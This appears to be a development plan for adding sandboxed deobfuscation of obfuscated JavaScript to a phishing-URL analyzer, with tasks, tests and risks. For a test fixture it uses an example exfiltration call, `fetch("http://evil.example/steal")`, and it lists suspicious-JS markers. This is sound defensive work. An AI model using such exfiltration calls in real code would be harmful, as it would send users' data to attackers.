# Phase: JS Deobfuscation in url-analyze.sh

**Tool decision:** `webcrack` primary, `REstringer` optional escalation, JStillery rejected.
See [RESEARCH.md](./RESEARCH.md).

## Goal (what must be TRUE when done)

> When a scanned page ships obfuscated JavaScript, `url-analyze.sh` deobfuscates it in a
> sandbox, re-scans the *cleartext* for phishing signals that the obfuscation was hiding
> (exfil URLs, redirect targets, crypto addresses, credential/eval sinks), feeds those into
> the LLM context and the deterministic verdict — and **never executes attacker JS on the host**.

Concretely, all of these must hold:
1. A page whose real payload (e.g. an exfil URL `evil.example/steal`) is hidden by obfuscator.io
   is flagged: the deobfuscated signal appears in the output and the verdict escalates.
2. A clean/legit page with normal minified JS is **not** dragged to DANGEROUS (no false alarm).
3. Deobfuscation only runs when obfuscation markers are present (cost control), and its output
   is cached in the existing `.cache/<url-hash>/` dir so re-scans/benchmark reuse it.
4. The deobfuscator runs in a `--network none`, cap-dropped, memory/CPU-limited container.

## Design fit (reuse, don't reinvent)

- Model this on the **existing vision-escalation pattern** in `url-analyze.sh`: a gated,
  expensive step that produces a NOTE fed to the LLM. Gate = `SUSP_JS` non-empty.
- Reuse the **hashed cache** (`.cache/<url-hash>/`) already built for page/screenshot/meta.
- Reuse the **existing smell regexes** in `page-fetch.sh` (crypto, sensitive fields, urgency,
  IP fingerprint hosts, eval/atob) — run them again over deobfuscated text.
- Reuse the **sandbox recipe** from `page-fetch.sh`'s `docker run` (cap-drop, no-new-privileges,
  memory/cpus) — tighten with `--network none` since deobfuscation needs no network.
- Reuse the **deterministic floor** in `verdict.sh`: add deobfuscated red flags to `count_red_flags`.

## Tasks (goal-backward, grouped into waves)

### Wave 1 — independent building blocks

**T1. Capture full inline scripts (page-fetch.js)**
- Today `page-fetch.js` truncates inline script text to 1000 chars. Add: when suspicious-JS
  markers fire (eval/atob/document.write/hex/location), emit the **full** inline script bodies.
- Write them to the cache dir (`$CACHE_DIR/scripts/NN.js`) via a new optional env like the
  screenshot (`PAGE_SCRIPTS_DIR`), mirroring the `PAGE_SHOT` mechanism. Keep JSON output small.
- Verify: scan a page with inline `eval(...)`, confirm `scripts/*.js` written with full body.
- Commit: `feat(js-deob): capture full inline scripts to cache when obfuscation detected`

**T2. Sandboxed deobfuscator runner (`js-deobfuscate.sh`, new)**
- Input: a `.js` file (or stdin). Output: deobfuscated JS on stdout.
- Runs `webcrack` inside a locked-down Node container:
  `docker run --rm --network none --cap-drop ALL --security-opt no-new-privileges
   --memory 1g --cpus 1 --read-only ... local-llm-webcrack webcrack /in/script.js`
- Ensure image once (like page-fetch pulls puppeteer): build `local-llm-webcrack` from
  `node:22-alpine` + `npm i -g webcrack` if absent. Pin the webcrack version.
- Handle failure/timeout: return the original JS unchanged, non-zero, so callers degrade gracefully.
- Verify (golden): obfuscate `fetch("http://evil.example/steal")` with obfuscator.io into a
  checked-in fixture `test-corpus/js/obf-exfil.js`; assert deobfuscated output contains
  `evil.example`. This is the one runnable check the shortcut leaves behind.
- Commit: `feat(js-deob): add sandboxed webcrack runner js-deobfuscate.sh`

### Wave 2 — integrate (depends on Wave 1)

**T3. Post-deobfuscation signal extraction**
- Given deobfuscated JS, extract signals the obfuscation was hiding: URLs (esp. off-domain
  POST/exfil), `location=`/redirect targets, crypto wallet addresses, sensitive field names,
  `eval`/`atob` sinks with now-readable args, brand strings.
- Reuse `page-fetch.js`'s smell regexes (factor them into a small shared JS/helper if cheap;
  otherwise a focused grep/regex pass in the runner). Output a `deobfuscatedSignals` list +
  a one-line human summary.
- Verify: fixture from T2 yields a signal naming `evil.example`.
- Commit: `feat(js-deob): extract phishing signals from deobfuscated JS`

**T4. Wire into url-analyze.sh (gated escalation)**
- After signal extraction, before the LLM call: if `SUSP_JS` non-empty and not disabled,
  run js-deobfuscate.sh on the cached scripts, collect signals into `DEOBFUS_NOTE` / a
  `DEOBFUS_SIGNALS` string.
- Add `DEOBFUS_NOTE` to the LLM `CONTEXT` as a new EXTRACTED SIGNAL line (like the vision note).
- Add flag `-D` (skip deobfuscation) and cache the deobfuscated output/summary in `.cache/`.
- Verify: end-to-end run on the obfuscated fixture page shows the deob note + escalated verdict.
- Commit: `feat(js-deob): escalate to JS deobfuscation on obfuscation signals`

### Wave 3 — verdict + polish (depends on Wave 2)

**T5. Deterministic red flags + docs + test**
- `verdict.sh count_red_flags`: +1 flag when deobfuscation reveals a new exfil/off-domain URL,
  a hidden redirect, or a crypto address. So an obfuscated login page floors to DANGEROUS.
- Guard against false positives: benign minified JS with no new signals adds **no** flag (T-goal #2).
- Docs: add to `CLAUDE.md` (tools table, Phase-3 section, `-D` flag, `local-llm-webcrack` dep).
- Test: extend the golden fixture into `url-corpus.txt` so `url-benchmark.sh` covers the
  obfuscated-DANGEROUS case (heuristic vs LLM).
- Commit: `feat(js-deob): count deobfuscated red flags + docs + corpus case`

## Risks / decisions

- **Node version:** webcrack needs Node 22/24 → dedicated `node:22-alpine` image, not the
  Puppeteer image. Pin webcrack version in the image build.
- **Offline first-run:** `npx` fetches on first use. Bake webcrack into `local-llm-webcrack`
  once (built on demand, cached), same UX as the pre-pulled puppeteer image.
- **External `<script src>`:** start **inline-only** (YAGNI). Fetching + deobfuscating remote
  scripts is a follow-up; note it, don't build it.
- **Cost:** only runs when obfuscation markers present; cached per URL. Like vision, it's an
  escalation, not a default cost on every scan.
- **Escalation to REstringer:** only if webcrack output still looks obfuscated. Keep the
  `--network none` sandbox. Defer until a real page defeats webcrack.
- **Never execute on host:** hard requirement across all tasks.

## Out of scope
- Remote/external script fetching, WASM, sourcemap reconstruction, non-obfuscator.io packers
  beyond what webcrack handles out of the box.
